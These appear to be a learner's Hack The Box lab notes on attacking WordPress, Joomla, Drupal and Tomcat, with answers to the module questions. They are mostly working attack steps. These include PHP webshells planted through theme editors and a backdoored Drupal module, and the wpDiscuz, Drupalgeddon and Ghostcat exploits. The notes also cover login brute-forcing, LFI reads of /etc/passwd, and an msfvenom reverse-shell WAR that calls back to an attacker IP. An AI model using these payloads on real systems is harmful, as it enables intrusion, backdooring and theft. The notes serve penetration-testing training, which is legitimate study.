## Application Discovery and Enumeration
```
## Initial Enumeration
- Given the scope for the test:
areaeric@htb[/htb]$ cat scope_list 

- Scanning common internet ports:
areaeric@htb[/htb]$ sudo  nmap -p 80,443,8000,8080,8180,8888,10000 --open -oA web_discovery -iL scope_list 

- A more detailed enumeration:
areaeric@htb[/htb]$ sudo nmap --open -sV 10.129.201.50

## Using Eyewitness
- Taking screenshot using the Nmap XML output from the discovery scan:
areaeric@htb[/htb]$ eyewitness --web -x web_discovery.xml -d inlanefreight_eyewitness

## Using Aquatone
- Using nmap XML output to create a report
areaeric@htb[/htb]$ cat web_discovery.xml | ./aquatone -nmap

## Interpreting the Results
- Look at high value targets, sometimes treasure hide in them.


## Questions
Q1: Use what you've learned from this section to generate a report with EyeWitness. What is the name of the .db file EyeWitness creates in the inlanefreight_eyewitness folder? (Format: filename.db)

Q2: What does the header on the title page say when opening the aquatone_report.html page with a web browser? (Format: 3 words, case sensitive)


- Setting up vhosts
IP=10.129.82.86
printf "%s\t%s\n\n" "$IP" "app.inlanefreight.local dev.inlanefreight.local drupal-dev.inlanefreight.local drupal-qa.inlanefreight.local drupal-acc.inlanefreight.local drupal.inlanefreight.local blog.inlanefreight.local" | sudo tee -a /etc/hosts

code for vhosts.

- Running nmap scan (ref ## Initial Enumeration)
sudo  nmap -p 80,443,8000,8080,8180,8888,10000 --open -oA web_discovery -iL scope_list

- Running Eyewitness (ref ## Eyewitness)
eyewitness --web -x web_discovery.xml -d inlanefreight_eyewitness
	-> see ew.db in folder

- Running aquatone (ref ## Aquatone)
cat web_discovery.xml | aquatone -nmap
	-> Openning the report, we see Pages by Similarity.
```

## Content Management System (CMS)
#### WordPress - Discovery & Enumeration
```
## Discovery
- Quick way to identify WordPress site is by browsing to the /robots.txt file.
	-> E.g. typical robots.txt on a WordPress installation
User-agent: *
Disallow: /wp-admin/
Allow: /wp-admin/admin-ajax.php
Disallow: /wp-content/uploads/wpforms/

Sitemap: https://inlanefreight.local/wp-sitemap.xml

- Wordpress stores plugin and themes in wp-content/plugins and wp-content/themes respectively

## Enumeration
- Grepping for wordpress
areaeric@htb[/htb]$ curl -s http://blog.inlanefreight.local | grep WordPress

<meta name="generator" content="WordPress 5.8" /

- Looking for themes:
areaeric@htb[/htb]$ curl -s http://blog.inlanefreight.local/ | grep themes

<link rel='stylesheet' id='bootstrap-css'  href='http://blog.inlanefreight.local/wp-content/themes/business-gravity/assets/vendors/bootstrap/css/bootstrap.min.css' type='text/css' media='all' />

- Looking for plugins
areaeric@htb[/htb]$ curl -s http://blog.inlanefreight.local/ | grep plugins

<link rel='stylesheet' id='contact-form-7-css'  href='http://blog.inlanefreight.local/wp-content/plugins/contact-form-7/includes/css/styles.css?ver=5.4.2' type='text/css' media='all' />
<script type='text/javascript' src='http://blog.inlanefreight.local/wp-content/plugins/mail-masta/lib/subscriber.js?ver=5.8' id='subscriber-js-js'></script>
<script type='text/javascript' src='http://blog.inlanefreight.local/wp-content/plugins/mail-masta/lib/jquery.validationEngine-en.js?ver=5.8' id='validation-engine-en-js'></script>
<script type='text/javascript' src='http://blog.inlanefreight.local/wp-content/plugins/mail-masta/lib/jquery.validationEngine.js?ver=5.8' id='validation-engine-js'></script>
		<link rel='stylesheet' id='mm_frontend-css'  href='http://blog.inlanefreight.local/wp-content/plugins/mail-masta/lib/css/mm_frontend.css?ver=5.8' type='text/css' media='all' />
<script type='text/javascript' src='http://blog.inlanefreight.local/wp-content/plugins/contact-form-7/includes/js/index.js?ver=5.4.2' id='contact-form-7-js'></script>

	-> Browsing to `http://blog.inlanefreight.local/wp-content/plugins/mail-masta/` shows us that directory listing is enabled and that a readme.txt file is present.
	-> Reading the file we see the version is 1.0.0, which suffers from Local File Inclusion vulnerability that was published in August of 2021.

- Checking the source of another page, we see that the wpDiscuz plugin is installed, and it appears to be 7.0.4:

areaeric@htb[/htb]$ curl -s http://blog.inlanefreight.local/?p=1 | grep plugins

<link rel='stylesheet' id='contact-form-7-css'  href='http://blog.inlanefreight.local/wp-content/plugins/contact-form-7/includes/css/styles.css?ver=5.4.2' type='text/css' media='all' />
<link rel='stylesheet' id='wpdiscuz-frontend-css-css'  href='http://blog.inlanefreight.local/wp-content/plugins/wpdiscuz/themes/default/style.css?ver=7.0.4' type='text/css' media='all' />

	-> A quick search shows that it has an unauthenticated code execution vulnerability from June of 2021.

## Enumerating Users
- We can perform some manual enumeration of users on the login page `/wp-login.php`
	-> Username login would often tell if a user existed or not. 

## WPScan
- WPScan is an automated WordPress scanner and enumeration tool.
	-> Perform some enumeration:
areaeric@htb[/htb]$ sudo wpscan --url http://blog.inlanefreight.local --enumerate --api-token dEOFB<SNIP>

## Questions
Q1: Enumerate the host and find a flag.txt flag in an accessible directory.
- Perform wordpress enumeration (ref to ## WPScan)
wpscan --url http://blog.inlanefreight.local --enumerate --api-token F0SeyOpEj5GWb1MpqQJG7GqjWG1ysi68m0Dw9lFwFCE

	-> saw the following output [+] Upload directory has listing enabled: http://blog.inlanefreight.local/wp-content/uploads/ 
	-> went to browse the directory, and the flag is at http://blog.inlanefreight.local/wp-content/uploads/2021/08/flag.txt

Q2:Perform manual enumeration to discover another installed plugin. Submit the plugin name as the answer (3 words).
- We browse to the page like in ## Enumeration

curl http://blog.inlanefreight.local/?p=1 | grep plugin
	-> see wp-sitemap-page

Q3: Find the version number of this plugin. (i.e., 4.5.2)
- we go to the readme.txt (ref to ## Enumeration)

http://blog.inlanefreight.local/wp-content/plugins/wp-sitemap-page/readme.txt
	-> stable version 1.6.4
```

#### Attacking WordPress
```
## Login BruteForce
- Perform login brute forcing for WordPress on the user discovered
areaeric@htb[/htb]$ sudo wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local

## Code Execution
- Click on Appearance on the side and select theme editor.
- Then select an alternative theme such as Twenty Nineteen and edit an uncommon page such as 404.php to add a webshell:

system($_GET[0]);
	-> add this just below the comments to avoid too much modification of the content

- Click on update file at the bottom to save.
- We know wordpress themes are located at `/wp-content/themes/<theme name>`, so we can utilize this access to gain an interactive reverse shell

areaeric@htb[/htb]$ curl http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=id

uid=33(www-data) gid=33(www-data) groups=33(www-data)

- The wp_admin_shell_upload module from Metasploit can be used to upload a shell and execute it automatically

msf6 > use exploit/unix/webapp/wp_admin_shell_upload 

[*] No payload configured, defaulting to php/meterpreter/reverse_tcp

msf6 exploit(unix/webapp/wp_admin_shell_upload) > set rhosts blog.inlanefreight.local
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set username john
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set password firebird1
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set lhost 10.10.14.15 
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set rhost 10.129.42.195  
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set VHOST blog.inlanefreight.local

	-> We can use show options to confirm everything is set up right.
	-> Starting the exploit:
msf6 exploit(unix/webapp/wp_admin_shell_upload) > exploit
meterpreter > getuid

## Leveraging Known vulnerabilties
Note: We can use the [waybackurls](https://github.com/tomnomnom/waybackurls) tool to look for older versions of a target site using the Wayback Machine. Sometimes we may find a previous version of a WordPress site using a plugin that has a known vulnerability. If the plugin is no longer in use but the developers did not remove it properly, we may still be able to access the directory it is stored in and exploit a flaw.

- Vulnerble Plugins - mail-masta
	-> Suffers from unauthenitcated SQL injection and Local File Inclusion 
	-> e.g. vulnerable code:
<?php 

include($_GET['pl']);
global $wpdb;

$camp_id=$_POST['camp_id'];
$masta_reports = $wpdb->prefix . "masta_reports";
$count=$wpdb->get_results("SELECT count(*) co from  $masta_reports where camp_id=$camp_id and status=1");

echo $count[0]->co;

?>
		-> The pl parameter does not have any input sanitisation, so we can include arbitrary file on the webserver
		
	-> including contents of /etc/passwd
areaeric@htb[/htb]$ curl -s http://blog.inlanefreight.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd

root:x:0:0:root:/root:/bin/bash
...

- Vulnerable Plugins - wpdiscuz
	-> Version 7.04 has a file upload bypass 
areaeric@htb[/htb]$ python3 wp_discuz.py -u http://blog.inlanefreight.local -p /?p=1

---------------------------------------------------------------
[-] Wordpress Plugin wpDiscuz 7.0.4 - Remote Code Execution
[-] File Upload Bypass Vulnerability - PHP Webshell Upload
[-] CVE: CVE-2020-24186
[-] https://github.com/hevox
--------------------------------------------------------------- 

[+] Response length:[102476] | code:[200]
[!] Got wmuSecurity value: 5c9398fcdb
[!] Got wmuSecurity value: 1 

[+] Generating random name for Webshell...
[!] Generated webshell name: uthsdkbywoxeebg

[!] Trying to Upload Webshell..
[+] Upload Success... Webshell path:url&quot;:&quot;http://blog.inlanefreight.local/wp-content/uploads/2021/08/uthsdkbywoxeebg-1629904090.8191.php&quot; 

> id

[x] Failed to execute PHP code...

		-> the exploit as written may fail, but appending ?cmd= after the .php extension to run commands which we can see in the exploit script:

areaeric@htb[/htb]$ curl -s http://blog.inlanefreight.local/wp-content/uploads/2021/08/uthsdkbywoxeebg-1629904090.8191.php?cmd=id

GIF689a;

uid=33(www-data) gid=33(www-data) groups=33(www-data)

## Questions
Q1: Perform user enumeration against http://blog.inlanefreight.local. Aside from admin, what is the other user present?

- Ref from ## Wpscan in previous section, the command
 
wpscan --url http://blog.inlanefreight.local --enumerate --api-token F0SeyOpEj5GWb1MpqQJG7GqjWG1ysi68m0Dw9lFwFCE

gives doug

Q2: Perform a login bruteforcing attack against the discovered user. Submit the user's password as the answer.

- We perform brute force as follows (ref to ## Login brute force)
sudo wpscan --password-attack xmlrpc -t 20 -U doug -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local
	-> obtained doug:jessica1

Q3: Using the methods shown in this section, find another system user whose login shell is set to /bin/bash.

- We first login to word press using credential we have (ref to ## Code execution)
	-> We first go the page:
	http://blog.inlanefreight.local/wp-admin

	-> go to appearences -> themes -> theme editor -> edit theme twenty nineteen on 404.php, update the file with
	system($_GET[0]);

- Access the page to perform rce (ref to ## Code execution)
curl http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=id

- Find user with specific bash shell throug /etc/passwd
curl http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=cat%20/etc/passwd

	-> We see web admin has the shell /bin/bash

Q4: Following the steps in this section, obtain code execution on the host and submit the contents of the flag.txt file in the webroot.

- Finding webroot through rce

curl http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=pwd

	-> /var/www/blog.inlanefreight.local/wp-content/themes/twentynineteen

	-> web root is /var/www/blog.inlanefreight.local

	-> curl http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=ls%20%2Fvar%2Fwww%2Fblog.inlanefreight.local

		-> see the flag_d8e8fca2dc0f896fd7cb4cb0031ba249.txt  

curl http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=cat%20%2Fvar%2Fwww%2Fblog.inlanefreight.local%2Fflag_d8e8fca2dc0f896fd7cb4cb0031ba249.txt  
```

#### Joomla - Discovery & Enumeration
```
## Discovery and footprinting
- Footprinting a Joomla
	areaeric@htb[/htb]$ curl -s http://dev.inlanefreight.local/ | grep Joomla
	
		<meta name="generator" content="Joomla! - Open Source Content Management" />
	
	
	<SNIP>

- Structure of robots.txt file:
	# If the Joomla site is installed within a folder
	# eg www.example.com/joomla/ then the robots.txt file
	# MUST be moved to the site root
	# eg www.example.com/robots.txt
	# AND the joomla folder name MUST be prefixed to all of the
	# paths.
	# eg the Disallow rule for the /administrator/ folder MUST
	# be changed to read
	# Disallow: /joomla/administrator/
	#
	# For more information about the robots.txt standard, see:
	# https://www.robotstxt.org/orig.html
	
	User-agent: *
	Disallow: /administrator/
	Disallow: /bin/
	Disallow: /cache/
	Disallow: /cli/
	Disallow: /components/
	Disallow: /includes/
	Disallow: /installation/
	Disallow: /language/
	Disallow: /layouts/
	Disallow: /libraries/
	Disallow: /logs/
	Disallow: /modules/
	Disallow: /plugins/
	Disallow: /tmp/

- Attempt of fingerprinting Joomla version if it exists
	curl -s http://dev.inlanefreight.local/README.txt | head -n 5

- more version fingerprinting attempt
	curl -s http://dev.inlanefreight.local/administrator/manifests/files/joomla.xml | xmllint --format -

## Enumeration
- tool install
	sudo pip3 install droopescan

- Running the scan
	droopescan scan joomla --url http://dev.inlanefreight.local/

- Running scan with more tools
joomscan -u http://app.inlanefreight.local

- Performing brute force
sudo python3 joomla-brute.py -u http://dev.inlanefreight.local -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin

## Questions
Q1: Fingerprint the Joomla version in use on http://app.inlanefreight.local (Format: x.x.x)
- Use related scanning tool (ref to ## Enumeration)
joomscan -u http://app.inlanefreight.local
	-> get version

Q2: Find the password for the admin user on http://app.inlanefreight.local
- Use related brute force script (ref to ## Enumeration)
sudo python3 joolma-brute.py -u http://app.inlanefreight.local -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin
```

#### Attacking Joomla
```
## Abusing Built-in Functionality
- Log in to `http://dev.inlanefreight.local/administrator` with credential obtained.
- Click on `Templates` on the bottom left under `Configuration` to pull up the templates menu

- Choose `protostar` under the `Template` column header

- Add the following php webshell code to error.php
system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);

- Click save & close and confirm code execution with cURL
areaeric@htb[/htb]$ curl -s http://dev.inlanefreight.local/templates/protostar/error.php?dcfdd5e021a869fcc6dfaef8bf31377e=id

uid=33(www-data) gid=33(www-data) groups=33(www-data)

## Leveraging Known Vulnerabilities
- Find an known CVE, https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-10945, and execute it with the following:

python3 CVE-2019-10945.py  --url "http://dev.inlanefreight.local/administrator/" --username admin --password admin --dir /

## Questions
Leverage the directory traversal vulnerability to find a flag in the web root of the http://dev.inlanefreight.local/ Joomla application

- Running script to attack in (ref ## Leveraging Known Vulnerabilities)
python3 CVE-2019-10945.py  --url "http://dev.inlanefreight.local/administrator/" --username admin --password admin --dir /
-> flag_6470e394cbf6dab6a91682cc8585059b.txt 

- Code execution
Browse to http://dev.inlanefreight.local/flag_6470e394cbf6dab6a91682cc8585059b.txt
or curl it
```

#### Drupal - Discovery & Enumeration
```
## Discovery/Footprinting
- Looking for Drupal as the CMS doesn't look like wordpress or Joomlas

curl -s http://drupal.inlanefreight.local | grep Drupal

- Identify Drupal through nodes:
	- Page URIs are usually of the form `/node/<nodeid>`

Note: Not every Drupal installation will look the same or display the login page or even allow users to access the login page from the internet.

## Enumeration
- Discover Drupal
curl -s http://drupal-acc.inlanefreight.local/CHANGELOG.txt | grep -m2 ""

- try enumerate aginst newer version of drupal

curl -s http://drupal.inlanefreight.local/CHANGELOG.txt
-> 404 response, newer version can't access changelog

- Running droopescan
droopescan scan drupal -u http://drupal.inlanefreight.local

## Questions
Identify the Drupal version number in use on http://drupal-qa.inlanefreight.local

- Run the scan (ref to ## Enumeration)
droopescan scan drupal -u http://drupal-qa.inlanefreight.local
```

#### Attacking Drupal
```
## Leveraging the PHP Filter Module
- In older versions of Drupal (before version 8), it was possible to log in as an admin and enable the `PHP filter` module, which "Allows embedded PHP code/snippets to be evaluated."

- browse to the site: http://drupal-qa.inlanefreight.local/node#overlay=admin/modules and enable php filter

- add content and create basic page and add the following:

<?php
system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);
?>

	-> make sure to set `Text format` drop-down to `PHP code`
	-> After clicking save, we will be redirected to the new page, in this example `http://drupal-qa.inlanefreight.local/node/3`

	-> Execute the code:
areaeric@htb[/htb]$ curl -s http://drupal-qa.inlanefreight.local/node/3?dcfdd5e021a869fcc6dfaef8bf31377e=id | grep uid | cut -f4 -d">"

uid=33(www-data) gid=33(www-data) groups=33(www-data)

- version 8 onwards php filter needs manual download
	-> Download the file
wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz

	-> Once downloaded go to `Administration` > `Reports` > `Available updates`.

Note: Location may differ based on the Drupal version and may be under the Extend menu.

	-> From here, click on `Browse,` select the file from the directory we downloaded it to, and then click `Install`.

	-> Once the module is installed, we can click on `Content` and create a new basic page, similar to how we did in the Drupal 7 example. Again, be sure to select `PHP code` from the `Text format` dropdown.

## Uploading a Backdoored Module
- With appropriate permission we can upload new module.
	-> E.g. Download the archive and extract its contents. 

areaeric@htb[/htb]$ wget --no-check-certificate  https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
areaeric@htb[/htb]$ tar xvf captcha-8.x-1.2.tar.gz

	-> Create a PHP web shell with the contents:
<?php
system($_GET[fe8edbabc5c5c9b7b764504cd22b17af]);
?>

	-> Next, we need to create a .htaccess file to give ourselves access to the folder. This is necessary as Drupal denies direct access to the /modules folder.

<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
</IfModule>

	-> Copy both of the files to the captcha folder and create an archive
areaeric@htb[/htb]$ mv shell.php .htaccess captcha
areaeric@htb[/htb]$ tar cvf captcha.tar.gz captcha/

captcha/
captcha/.travis.yml
captcha/README.md
captcha/captcha.api.php
captcha/captcha.inc
captcha/captcha.info.yml
captcha/captcha.install

<SNIP>

- Assuming we have administrative access to the website, click on `Manage` and then `Extend` on the sidebar. 
	-> Next, click on the `+ Install new module` button, and we will be taken to the install page, such as `http://drupal.inlanefreight.local/admin/modules/install` Browse to the backdoored Captcha archive and click `Install`.

- Once the installation succeeds, browse to `/modules/captcha/shell.php` to execute commands.

areaeric@htb[/htb]$ curl -s drupal.inlanefreight.local/modules/captcha/shell.php?fe8edbabc5c5c9b7b764504cd22b17af=id

uid=33(www-data) gid=33(www-data) groups=33(www-data)

## Leveraging Known Vulnerabilities
- Drupalgeddon:
	-> this flaw can be exploited by leveraging a pre-authentication SQL injection 
	-> Affects version 7.0 up to 7.31

	-> Running the script
areaeric@htb[/htb]$ python2.7 drupalgeddon.py -t http://drupal-qa.inlanefreight.local -u hacker -p pwnd

<SNIP>

[!] VULNERABLE!

[!] Administrator user created!

[*] Login: hacker
[*] Pass: pwnd
[*] Url: http://drupal-qa.inlanefreight.local/?q=node&destination=node

	-> Now let's see if we can log in as an admin. We can! Now from here, we could obtain a shell through the various means discussed previously in this section.

- Drupalgeddon2, rce vulnerability for versions of Drupal prior to 7.58 and 8.5.1
	-> Use the script as given:

areaeric@htb[/htb]$ python3 drupalgeddon2.py 

################################################################
# Proof-Of-Concept for CVE-2018-7600
# by Vitalii Rudnykh
# Thanks by AlbinoDrought, RicterZ, FindYanot, CostelSalanders
# https://github.com/a2u/CVE-2018-7600
################################################################
Provided only for educational or information purposes

Enter target url (example: https://domain.ltd/): http://drupal-dev.inlanefreight.local/

Check: http://drupal-dev.inlanefreight.local/hello.txt

	-> Verify that exploit is uploaded.
areaeric@htb[/htb]$ curl -s http://drupal-dev.inlanefreight.local/hello.txt

;-)

	-> Modify the script to gain remote code execution by uploading a malicious PHP file:
		-> PHP shell code:
<?php system($_GET[fe8edbabc5c5c9b7b764504cd22b17af]);?>

		-> base64 encoding of the shell code
areaeric@htb[/htb]$ echo '<?php system($_GET[fe8edbabc5c5c9b7b764504cd22b17af]);?>' | base64

PD9waHAgc3lzdGVtKCRfR0VUW2ZlOGVkYmFiYzVjNWM5YjdiNzY0NTA0Y2QyMmIxN2FmXSk7Pz4K

		-> Writing the base64 encoding of the shell code 
 echo "PD9waHAgc3lzdGVtKCRfR0VUW2ZlOGVkYmFiYzVjNWM5YjdiNzY0NTA0Y2QyMmIxN2FmXSk7Pz4K" | base64 -d | tee mrb3n.php

	-> Run the modified exploit script to upload our malicious PHP file

areaeric@htb[/htb]$ python3 drupalgeddon2.py 

################################################################
# Proof-Of-Concept for CVE-2018-7600
# by Vitalii Rudnykh
# Thanks by AlbinoDrought, RicterZ, FindYanot, CostelSalanders
# https://github.com/a2u/CVE-2018-7600
################################################################
Provided only for educational or information purposes

Enter target url (example: https://domain.ltd/): http://drupal-dev.inlanefreight.local/

Check: http://drupal-dev.inlanefreight.local/mrb3n.php

	-> Confirm remote code execution using `cURL`

areaeric@htb[/htb]$ curl http://drupal-dev.inlanefreight.local/mrb3n.php?fe8edbabc5c5c9b7b764504cd22b17af=id

uid=33(www-data) gid=33(www-data) groups=33(www-data)

- Drupalgeddon3 
	-> Is an authenticated remote code execution vulnerability that affects [multiple versions](https://www.drupal.org/sa-core-2018-004) of Drupal core. It requires a user to have the ability to delete a node

	-> To exploit it, we first get a session cookie through burp or other means.

	-> Then we run metasploit:
msf6 exploit(multi/http/drupal_drupageddon3) > set rhosts 10.129.42.195
msf6 exploit(multi/http/drupal_drupageddon3) > set VHOST drupal-acc.inlanefreight.local   
msf6 exploit(multi/http/drupal_drupageddon3) > set drupal_session SESS45ecfcb93a827c3e578eae161f280548=jaAPbanr2KhLkLJwo69t0UOkn2505tXCaEdu33ULV2Y
msf6 exploit(multi/http/drupal_drupageddon3) > set DRUPAL_NODE 1
msf6 exploit(multi/http/drupal_drupageddon3) > set LHOST 10.10.14.15
msf6 exploit(multi/http/drupal_drupageddon3) > show options 

	-> Obtain RCE if successful:
msf6 exploit(multi/http/drupal_drupageddon3) > exploit

## Questions
- Ref to ## Leveragining built-in functionality on php module, we can obtain RCE, i.e.

http://drupal.inlanefreight.local/node/2?dcfdd5e021a869fcc6dfaef8bf31377e=ls%20/var/www/drupal.inlanefreight.local

http://drupal.inlanefreight.local/node/2?dcfdd5e021a869fcc6dfaef8bf31377e=cat%20/var/www/drupal.inlanefreight.local/flag_6470e394cbf6dab6a91682cc8585059b.txt
```

## Servlet Containers/Software Development
#### Tomcat - Discovery & Enumeration
```
## Discovery/Footprinting
- Go to some custom error page like `http://app-dev.inlanefreight.local:8080/invalid` and see its version

- Go to the docs page
curl -s http://app-dev.inlanefreight.local:8080/docs/ | grep Tomcat 

- General folder structure of Tomcat

├── bin
├── conf
│   ├── catalina.policy
│   ├── catalina.properties
│   ├── context.xml
│   ├── tomcat-users.xml
│   ├── tomcat-users.xsd
│   └── web.xml
├── lib
├── logs
├── temp
├── webapps
│   ├── manager
│   │   ├── images
│   │   ├── META-INF
│   │   └── WEB-INF
|   |       └── web.xml
│   └── ROOT
│       └── WEB-INF
└── work
    └── Catalina

- Each folder inside webapps

webapps/customapp
├── images
├── index.jsp
├── META-INF
│   └── context.xml
├── status.xsd
└── WEB-INF
    ├── jsp
    |   └── admin.jsp
    └── web.xml
    └── lib
    |    └── jdbc_drivers.jar
    └── classes
        └── AdminServlet.class  
        
	-> The most important file among these is `WEB-INF/web.xm`
	-> E.g. of web.xml file
<?xml version="1.0" encoding="ISO-8859-1"?>

<!DOCTYPE web-app PUBLIC "-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN" "http://java.sun.com/dtd/web-app_2_3.dtd">

<web-app>
  <servlet>
    <servlet-name>AdminServlet</servlet-name>
    <servlet-class>com.inlanefreight.api.AdminServlet</servlet-class>
  </servlet>

  <servlet-mapping>
    <servlet-name>AdminServlet</servlet-name>
    <url-pattern>/admin</url-pattern>
  </servlet-mapping>
</web-app>   


	-> e.g. The `tomcat-users.xml` file is used to allow or disallow access to the `/manager` and `host-manager` admin pages.

<?xml version="1.0" encoding="UTF-8"?>

<SNIP>
  
<tomcat-users xmlns="http://tomcat.apache.org/xml"
              xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
              xsi:schemaLocation="http://tomcat.apache.org/xml tomcat-users.xsd"
              version="1.0">
<!--
  By default, no user is included in the "manager-gui" role required
  to operate the "/manager/html" web application.  If you wish to use this app,
  you must define such a user - the username and password are arbitrary.

  Built-in Tomcat manager roles:
    - manager-gui    - allows access to the HTML GUI and the status pages
    - manager-script - allows access to the HTTP API and the status pages
    - manager-jmx    - allows access to the JMX proxy and the status pages
    - manager-status - allows access to the status pages only

  The users below are wrapped in a comment and are therefore ignored. If you
  wish to configure one or more of these users for use with the manager web
  application, do not forget to remove the <!.. ..> that surrounds them. You
  will also need to set the passwords to something appropriate.
-->

   
 <SNIP>
  
!-- user manager can access only manager section -->
<role rolename="manager-gui" />
<user username="tomcat" password="tomcat" roles="manager-gui" />

<!-- user admin can access manager and admin section both -->
<role rolename="admin-gui" />
<user username="admin" password="admin" roles="manager-gui,admin-gui" />

## Enumeration
- After fingerprinting the Tomcat instance, unless it has a known vulnerability, we'll typically want to look for the `/manager` and the `/host-manager` pages. We can attempt to locate these with a tool such as `Gobuster` or just browse directly to them.

areaeric@htb[/htb]$ gobuster dir -u http://web01.inlanefreight.local:8180/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt 

===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://web01.inlanefreight.local:8180/
[+] Threads:        10
[+] Wordlist:       /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2021/09/21 17:34:54 Starting gobuster
===============================================================
/docs (Status: 302)
/examples (Status: 302)
/manager (Status: 302)
Progress: 49959 / 87665 (56.99%)^C
[!] Keyboard interrupt detected, terminating.
===============================================================
2021/09/21 17:44:29 Finished
===============================================================

	-> Attempt to login with weak credentials `tomcat:tomcat`, `admin:admin` or perform brute force attack against login page.

## Questions
Q1: What version of Tomcat is running on the application located at http://web01.inlanefreight.local:8180?
- Use curl (ref ## Discovery/Footprinting)
curl -s http://web01.inlanefreight.local:8180/docs/ | grep Tomcat

Q2: What role does the admin user have in the configuration example?
-> Looking at the example in the section, it is the rolename, so it is admin-gui.

<role rolename="admin-gui" />
<user username="admin" password="admin" roles="manager-gui,admin-gui" />
```

#### Attacking Tomcat
```
## Tomcat Manager - Login Brute Force
- If we can access the `/manager` or `/host-manager` endpoints, we can likely achieve remote code execution on the Tomcat server

	-> Use metasploit to brute force:

msf6 auxiliary(scanner/http/tomcat_mgr_login) > set VHOST web01.inlanefreight.local
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set RPORT 8180
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set stop_on_success true
	msf6 auxiliary(scanner/http/tomcat_mgr_login) > set rhosts 10.129.201.58

	-> Double check our exploit options:
msf6 auxiliary(scanner/http/tomcat_mgr_login) > show options 

	-> Running the module
msf6 auxiliary(scanner/http/tomcat_mgr_login) > run

	-> Using a proxy to see the result or for debugging
set PROXIES HTTP:127.0.0.1:8080
msf6 auxiliary(scanner/http/tomcat_mgr_login) > run

	-> The application performs base64 encoding of the credentials:
areaeric@htb[/htb]$ echo YWRtaW46dmFncmFudA== |base64 -d

admin:vagrant

	-> We can use a script like mgr_brute.py to achieve the saem result:

areaeric@htb[/htb]$ python3 mgr_brute.py -U http://web01.inlanefreight.local:8180/ -P /manager -u /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt -p /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt

## Tomcat Manager - WAR File Upload
- Many Tomcat installations provide a GUI interface to manage the application. This interface is available at `/manager/html` by default, which only users assigned the `manager-gui` role are allowed to access.

	-> Browse to `http://web01.inlanefreight.local:8180/manager/html` and we can deploy the web shell (cmd.jsp)

areaeric@htb[/htb]$ wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp
areaeric@htb[/htb]$ zip -r backup.war cmd.jsp 

	-> We can then deploy it.

	-> If we click on `backup`, we will get redirected to `http://web01.inlanefreight.local:8180/backup/` and get a `404 Not Found` error. We need to specify the `cmd.jsp` file in the URL as well.

	-> accessing the shell
areaeric@htb[/htb]$ curl http://web01.inlanefreight.local:8180/backup/cmd.jsp?cmd=id

	-> can also use msfvenom for a reverse shell:
areaeric@htb[/htb]$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.15 LPORT=4443 -f war > backup.war

		-> Starting a listenning to execute the shell:
areaeric@htb[/htb]$ nc -lnvp 4443

## CVE-2020-1938 : Ghostcat
- Tomcat was found to be vulnerable to an unauthenticated LFI in a semi-recent discovery named [Ghostcat](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-1938). All Tomcat versions before 9.0.31, 8.5.51, and 7.0.100 were found vulnerable

	-> Running nmap scan
areaeric@htb[/htb]$ nmap -sV -p 8009,8080 app-dev.inlanefreight.local

	-> The exploit can only read files and folders within the web apps folder, which means that files like `/etc/passwd` can’t be accessed

	-> Reading web.xml file
areaeric@htb[/htb]$ python2.7 tomcat-ajp.lfi.py app-dev.inlanefreight.local -p 8009 -f WEB-INF/web.xml 

		-> In some Tomcat installs, we may be able to access sensitive data within the WEB-INF file.

## Questions 
Q1/Q2: Perform a login bruteforcing attack against Tomcat manager at http://web01.inlanefreight.local:8180. What is the valid username?

- Use metasploit brute force (ref to ## Tomcat Manager - Login Brute Force)
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set VHOST web01.inlanefreight.local
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set RPORT 8180
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set stop_on_success true
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set rhosts 10.129.201.58
msf6 auxiliary(scanner/http/tomcat_mgr_login) > run
-> obtained tomcat:root

Q3: Obtain remote code execution on the http://web01.inlanefreight.local:8180 Tomcat instance. Find and submit the contents of tomcat_flag.txt

- Obtained rce through some upload war file (ref to ## Tomcat Manager - WAR File Upload), then:

msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.16.16 LPORT=4443 -f war > backup1.war

nc -lnvp 4443

find / -type f -name "tomcat_flag.txt" 2>/dev/null
-> /opt/tomcat/apache-tomcat-10.0.10/webapps/tomcat_flag.txt

